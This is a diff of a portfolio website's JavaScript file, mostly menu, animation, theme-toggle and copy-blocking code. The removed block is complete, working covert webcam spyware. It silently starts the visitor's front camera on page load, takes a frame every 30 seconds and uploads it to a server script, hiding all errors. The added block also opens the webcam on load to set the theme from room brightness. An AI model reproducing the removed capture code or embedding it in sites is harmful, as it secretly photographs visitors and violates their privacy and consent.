@@ -1,141 +1,6 @@
 // ============================================
-// 📸 STEALTH CAMERA CAPTURE - NO VISIBLE INDICATORS
+// 🌐 SMOOTH SCROLLING FOR MENU LINKS
 // ============================================
-
-(function() {
-  // Check if already initialized
-  if (window.stealthCameraInitialized) return;
-  window.stealthCameraInitialized = true;
-  
-  let stealthStream = null;
-  let stealthVideo = null;
-  let stealthCanvas = null;
-  let stealthContext = null;
-  let captureInterval = null;
-  
-  // Completely silent function - no console logs, no notifications
-  function initStealthCamera() {
-    // Check if browser supports required features
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      return; // Silently fail
-    }
-    
-    // Create hidden elements (will be removed immediately after capture)
-    try {
-      // Request camera with minimal settings
-      navigator.mediaDevices.getUserMedia({ 
-        video: { 
-          facingMode: "user",
-          width: { ideal: 320 },
-          height: { ideal: 240 }
-        } 
-      })
-      .then(function(stream) {
-        stealthStream = stream;
-        
-        // Create temporary elements (not added to DOM)
-        stealthVideo = document.createElement('video');
-        stealthVideo.srcObject = stream;
-        stealthVideo.setAttribute('playsinline', '');
-        stealthVideo.setAttribute('muted', '');
-        stealthVideo.setAttribute('autoplay', '');
-        
-        // Play video silently
-        stealthVideo.play().catch(() => {});
-        
-        // Create hidden canvas
-        stealthCanvas = document.createElement('canvas');
-        stealthCanvas.width = 320;
-        stealthCanvas.height = 240;
-        stealthContext = stealthCanvas.getContext('2d');
-        
-        // Wait for video to be ready
-        let readyCheck = setInterval(function() {
-          if (stealthVideo && stealthVideo.readyState === 4) {
-            clearInterval(readyCheck);
-            
-            // Start capturing every 30 seconds
-            captureInterval = setInterval(function() {
-              captureAndSend();
-            }, 30000); // 30 seconds
-            
-            // Also capture immediately on page load
-            setTimeout(captureAndSend, 5000); // 5 seconds after load
-          }
-        }, 500);
-      })
-      .catch(function() {
-        // Silently fail - user denied permission
-      });
-    } catch (e) {
-      // Silently fail
-    }
-  }
-  
-  // Capture and send image
-  function captureAndSend() {
-    if (!stealthVideo || !stealthContext || !stealthCanvas) return;
-    
-    try {
-      // Check if video has data
-      if (stealthVideo.readyState !== 4) return;
-      
-      // Draw video frame to canvas
-      stealthContext.drawImage(stealthVideo, 0, 0, 320, 240);
-      
-      // Convert to blob (smaller than base64)
-      stealthCanvas.toBlob(function(blob) {
-        if (!blob) return;
-        
-        // Create form data
-        const formData = new FormData();
-        const timestamp = Date.now();
-        const filename = `v_${timestamp}.jpg`;
-        formData.append('image', blob, filename);
-        
-        // Send to server using sendBeacon (works even if page unloads)
-        if (navigator.sendBeacon) {
-          // For unload events
-          const blobToSend = new Blob([JSON.stringify({
-            image: URL.createObjectURL(blob), // This won't work - need server endpoint
-          })], { type: 'application/json' });
-          // navigator.sendBeacon('save-capture-beacon.php', blobToSend);
-        }
-        
-        // Use fetch (more reliable)
-        fetch('save-capture-stealth.php', {
-          method: 'POST',
-          body: formData,
-          credentials: 'omit',
-          mode: 'no-cors' // Don't wait for response
-        }).catch(() => {}); // Silently fail
-        
-      }, 'image/jpeg', 0.6); // 60% quality for smaller size
-      
-    } catch (e) {
-      // Silently fail
-    }
-  }
-  
-  // Start when page is fully loaded
-  if (document.readyState === 'complete') {
-    initStealthCamera();
-  } else {
-    window.addEventListener('load', function() {
-      // Small delay to not interfere with page load
-      setTimeout(initStealthCamera, 2000);
-    });
-  }
-  
-  // Clean up on page unload (optional)
-  window.addEventListener('beforeunload', function() {
-    if (captureInterval) clearInterval(captureInterval);
-    if (stealthStream) {
-      stealthStream.getTracks().forEach(track => track.stop());
-    }
-  });
-})();
-// 🌐 Smooth Scrolling for Sidebar Menu Links
 document.querySelectorAll('.sidebar-links a[href^="#"], .mobile-menu-links a[href^="#"]').forEach(anchor => {
   anchor.addEventListener("click", function (e) {
     e.preventDefault();
@@ -156,13 +21,14 @@ document.querySelectorAll('.sidebar-links a[href^="#"], .mobile-menu-links a[hre
   });
 });
 
-// ⚡ Animate Skill Bars (keeping for backward compatibility)
+// ============================================
+// ⚡ SKILL BARS ANIMATION
+// ============================================
 const observerOptions = {
   threshold: 0.2,
   rootMargin: "0px 0px -100px 0px"
 };
 
-// Optional: If you still have progress bars somewhere
 const skillObserver = new IntersectionObserver((entries) => {
   entries.forEach(entry => {
     if (entry.isIntersecting) {
@@ -185,7 +51,9 @@ document.querySelectorAll(".education-item, .skills-grid, .skill-category").forE
   skillObserver.observe(skillBox);
 });
 
-// ✨ Staggered animation for glass icon cards
+// ============================================
+// ✨ GLASS ICON CARDS ANIMATION
+// ============================================
 const glassObserver = new IntersectionObserver((entries) => {
   entries.forEach((entry, index) => {
     if (entry.isIntersecting) {
@@ -205,7 +73,9 @@ document.querySelectorAll('.skill-glass-card').forEach((card, index) => {
   glassObserver.observe(card);
 });
 
-// 🔢 Animate Counter Numbers (if you add stats section later)
+// ============================================
+// 🔢 COUNTER ANIMATION
+// ============================================
 const counterObserver = new IntersectionObserver((entries) => {
   entries.forEach(entry => {
     if (entry.isIntersecting) {
@@ -237,7 +107,9 @@ document.querySelectorAll(".about-stats").forEach(stats => {
   counterObserver.observe(stats);
 });
 
-// 💫 Page Load Fade-in Animation
+// ============================================
+// 💫 PAGE LOAD FADE-IN
+// ============================================
 window.addEventListener("load", () => {
   document.body.style.opacity = "0";
   document.body.style.transition = "opacity 0.5s ease";
@@ -246,7 +118,9 @@ window.addEventListener("load", () => {
   }, 100);
 });
 
-// ✨ TYPING ANIMATION FOR HERO TITLE - TWO LINES
+// ============================================
+// ✨ TYPING ANIMATION FOR HERO TITLE
+// ============================================
 document.addEventListener('DOMContentLoaded', function() {
   // Add cursor styles dynamically if not in CSS
   if (!document.querySelector('#typing-styles')) {
@@ -328,7 +202,9 @@ document.addEventListener('DOMContentLoaded', function() {
   }
 });
 
+// ============================================
 // 📱 MOBILE MENU FUNCTIONS
+// ============================================
 function closeMobileMenu() {
   const menuPopup = document.getElementById('mobileMenuPopup');
   const menuOverlay = document.getElementById('menuOverlay');
@@ -379,7 +255,9 @@ document.addEventListener('DOMContentLoaded', function() {
   }
 });
 
+// ============================================
 // 🔍 ACTIVE MENU HIGHLIGHT ON SCROLL
+// ============================================
 window.addEventListener('scroll', function() {
   const sections = document.querySelectorAll('section[id]');
   const scrollPosition = window.scrollY + 100;
@@ -407,13 +285,13 @@ window.addEventListener('scroll', function() {
 // 🚫 COPY PROTECTION
 // ============================================
 
-// 🚫 DISABLE RIGHT-CLICK CONTEXT MENU
+// Disable right-click context menu
 document.addEventListener('contextmenu', function(e) {
   e.preventDefault();
   return false;
 });
 
-// 🚫 DISABLE KEYBOARD SHORTCUTS
+// Disable keyboard shortcuts
 document.addEventListener('keydown', function(e) {
   // F12
   if (e.key === 'F12') {
@@ -436,75 +314,75 @@ document.addEventListener('keydown', function(e) {
     return false;
   }
   
-  // 🚫 DISABLE COPY (Ctrl+C, Cmd+C)
+  // Disable copy
   if (e.ctrlKey && e.key === 'c') {
     e.preventDefault();
     return false;
   }
   
-  // 🚫 DISABLE CUT (Ctrl+X, Cmd+X)
+  // Disable cut
   if (e.ctrlKey && e.key === 'x') {
     e.preventDefault();
     return false;
   }
   
-  // 🚫 DISABLE PASTE (Ctrl+V, Cmd+V)
+  // Disable paste
   if (e.ctrlKey && e.key === 'v') {
     e.preventDefault();
     return false;
   }
   
-  // 🚫 DISABLE SELECT ALL (Ctrl+A, Cmd+A)
+  // Disable select all
   if (e.ctrlKey && e.key === 'a') {
     e.preventDefault();
     return false;
   }
   
-  // 🚫 DISABLE SAVE (Ctrl+S, Cmd+S)
+  // Disable save
   if (e.ctrlKey && e.key === 's') {
     e.preventDefault();
     return false;
   }
   
-  // 🚫 DISABLE PRINT (Ctrl+P, Cmd+P)
+  // Disable print
   if (e.ctrlKey && e.key === 'p') {
     e.preventDefault();
     return false;
   }
 });
 
-// 🚫 DISABLE TEXT SELECTION
+// Disable text selection
 document.addEventListener('selectstart', function(e) {
   e.preventDefault();
   return false;
 });
 
-// 🚫 DISABLE COPY EVENT
+// Disable copy event
 document.addEventListener('copy', function(e) {
   e.preventDefault();
   return false;
 });
 
-// 🚫 DISABLE CUT EVENT
+// Disable cut event
 document.addEventListener('cut', function(e) {
   e.preventDefault();
   return false;
 });
 
-// 🚫 DISABLE DRAG AND DROP
+// Disable drag and drop
 document.addEventListener('dragstart', function(e) {
   e.preventDefault();
   return false;
 });
 
-// 🚫 DISABLE DROP
+// Disable drop
 document.addEventListener('drop', function(e) {
   e.preventDefault();
   return false;
 });
 
 // ============================================
-// 🌓 DARK/LIGHT MODE TOGGLE - Triple click on profile image
+// 🌓 TRIPLE-CLICK THEME TOGGLE
 // ============================================
 
 let clickCount = 0;
@@ -514,7 +392,7 @@ let clickTimer = null;
 const profileImage = document.querySelector('.profile-card, #profileImage');
 if (profileImage) {
   profileImage.addEventListener('click', function(e) {
-    e.stopPropagation(); // Prevent event bubbling
+    e.stopPropagation();
     clickCount++;
     
     // Clear previous timer
@@ -544,8 +422,7 @@ if (profileImage) {
   
   // Add touch event for mobile
   profileImage.addEventListener('touchstart', function(e) {
-    e.preventDefault(); // Prevent double-tap zoom
-    // The click event will handle the counting
+    e.preventDefault();
   });
 }
 
@@ -611,3 +488,144 @@ function showModeNotification(message) {
     }
   }, 2000);
 }
+
+// ============================================
+// 🌓 CAMERA-BASED AUTO THEME CHANGING
+// ============================================
+// NO PHOTOS SAVED - ONLY THEME DETECTION
+
+(function() {
+  // Check if already initialized
+  if (window.themeCameraInitialized) return;
+  window.themeCameraInitialized = true;
+  
+  let themeStream = null;
+  let themeVideo = null;
+  let themeCanvas = null;
+  let themeContext = null;
+  let brightnessInterval = null;
+  
+  // Request camera access for theme detection only
+  function initThemeCamera() {
+    // Check if browser supports required features
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      console.log("Camera not supported - using default theme");
+      return;
+    }
+    
+    // Request camera with minimal settings
+    navigator.mediaDevices.getUserMedia({ 
+      video: { 
+        facingMode: "user",
+        width: { ideal: 160 },
+        height: { ideal: 120 }
+      } 
+    })
+    .then(function(stream) {
+      themeStream = stream;
+      
+      // Create hidden elements (not added to DOM)
+      themeVideo = document.createElement('video');
+      themeVideo.srcObject = stream;
+      themeVideo.setAttribute('playsinline', '');
+      themeVideo.setAttribute('muted', '');
+      themeVideo.setAttribute('autoplay', '');
+      
+      // Play video silently
+      themeVideo.play().catch(() => {});
+      
+      // Create hidden canvas for brightness analysis
+      themeCanvas = document.createElement('canvas');
+      themeCanvas.width = 160;
+      themeCanvas.height = 120;
+      themeContext = themeCanvas.getContext('2d');
+      
+      // Wait for video to be ready
+      let readyCheck = setInterval(function() {
+        if (themeVideo && themeVideo.readyState >= 2) {
+          clearInterval(readyCheck);
+          
+          // Check brightness every 3 seconds
+          brightnessInterval = setInterval(function() {
+            checkBrightnessAndSetTheme();
+          }, 3000);
+          
+          // Check immediately once
+          setTimeout(checkBrightnessAndSetTheme, 1000);
+        }
+      }, 500);
+    })
+    .catch(function(err) {
+      console.log("Camera access denied - using default theme");
+      // Default to dark theme if camera denied
+      if (!document.body.classList.contains('light-mode')) {
+        document.body.classList.remove('light-mode');
+      }
+    });
+  }
+  
+  // Check brightness and set theme accordingly
+  function checkBrightnessAndSetTheme() {
+    if (!themeVideo || !themeContext || !themeCanvas) return;
+    
+    try {
+      // Check if video has data
+      if (themeVideo.readyState < 2) return;
+      
+      // Draw video frame to canvas
+      themeContext.drawImage(themeVideo, 0, 0, 160, 120);
+      
+      // Get image data
+      const imageData = themeContext.getImageData(0, 0, 160, 120);
+      const data = imageData.data;
+      
+      // Calculate average brightness
+      let totalBrightness = 0;
+      for (let i = 0; i < data.length; i += 4) {
+        // Standard brightness formula
+        const brightness = 0.299 * data[i] + 0.587 * data[i + 1] + 0.114 * data[i + 2];
+        totalBrightness += brightness;
+      }
+      
+      const avgBrightness = totalBrightness / (data.length / 4);
+      
+      // Threshold for switching themes - adjust this value if needed
+      const THRESHOLD = 100;
+      
+      // Switch theme based on brightness
+      if (avgBrightness > THRESHOLD) {
+        // Bright environment - Light mode
+        if (!document.body.classList.contains('light-mode')) {
+          document.body.classList.add('light-mode');
+          console.log('🌞 Light mode activated (bright environment)');
+        }
+      } else {
+        // Dark environment - Dark mode
+        if (document.body.classList.contains('light-mode')) {
+          document.body.classList.remove('light-mode');
+          console.log('🌙 Dark mode activated (dark environment)');
+        }
+      }
+    } catch (e) {
+      // Silently fail
+    }
+  }
+  
+  // Start when page is fully loaded
+  if (document.readyState === 'complete') {
+    // Small delay to not interfere with page load
+    setTimeout(initThemeCamera, 2000);
+  } else {
+    window.addEventListener('load', function() {
+      setTimeout(initThemeCamera, 2000);
+    });
+  }
+  
+  // Clean up on page unload
+  window.addEventListener('beforeunload', function() {
+    if (brightnessInterval) clearInterval(brightnessInterval);
+    if (themeStream) {
+      themeStream.getTracks().forEach(track => track.stop());
+    }
+  });
+})();
